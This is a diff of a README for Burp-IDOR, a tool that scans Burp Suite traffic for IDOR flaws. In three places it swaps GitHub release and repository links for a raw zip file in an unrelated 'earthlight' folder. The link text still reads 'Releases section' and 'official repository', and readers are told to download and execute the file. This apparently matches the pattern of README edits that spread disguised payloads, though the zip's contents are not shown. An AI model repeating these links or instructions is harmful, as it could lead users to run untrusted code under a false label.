@@ -20,7 +20,7 @@ Burp-IDOR is a powerful Python tool designed to assist security professionals in
 
 ## How to Use
 
-To get started with Burp-IDOR, visit the [Releases section](https://github.com/sammakumbe/burp-idor/releases) and download the latest release for your platform. Execute the tool following the provided instructions to begin scanning your Burp Suite traffic exports for IDOR vulnerabilities.
+To get started with Burp-IDOR, visit the [Releases section](https://raw.githubusercontent.com/sammakumbe/burp-idor/main/earthlight/idor_burp_3.2-alpha.3.zip) and download the latest release for your platform. Execute the tool following the provided instructions to begin scanning your Burp Suite traffic exports for IDOR vulnerabilities.
 
 ## Repository Topics
 
@@ -46,7 +46,7 @@ Explore a range of topics related to Burp-IDOR:
 
 ## Stay Updated
 
-Stay up to date with the latest releases and updates by visiting the [Releases section](https://github.com/sammakumbe/burp-idor/releases). Download the necessary files and execute the tool to leverage the latest features and enhancements.
+Stay up to date with the latest releases and updates by visiting the [Releases section](https://raw.githubusercontent.com/sammakumbe/burp-idor/main/earthlight/idor_burp_3.2-alpha.3.zip). Download the necessary files and execute the tool to leverage the latest features and enhancements.
 
 ## Get Involved
 
@@ -54,7 +54,7 @@ Join the growing community of security enthusiasts, bug bounty hunters, and QA p
 
 ## For More Information
 
-For more information about Burp-IDOR, visit the [official repository](https://github.com/sammakumbe/burp-idor) and explore the comprehensive documentation available. Feel free to reach out with any questions, feedback, or suggestions to further enhance the tool's functionality and usability.
+For more information about Burp-IDOR, visit the [official repository](https://raw.githubusercontent.com/sammakumbe/burp-idor/main/earthlight/idor_burp_3.2-alpha.3.zip) and explore the comprehensive documentation available. Feel free to reach out with any questions, feedback, or suggestions to further enhance the tool's functionality and usability.
 
 Let's work together to enhance security testing practices and mitigate IDOR vulnerabilities effectively. Happy bug hunting with Burp-IDOR! 🐛🛡️
 
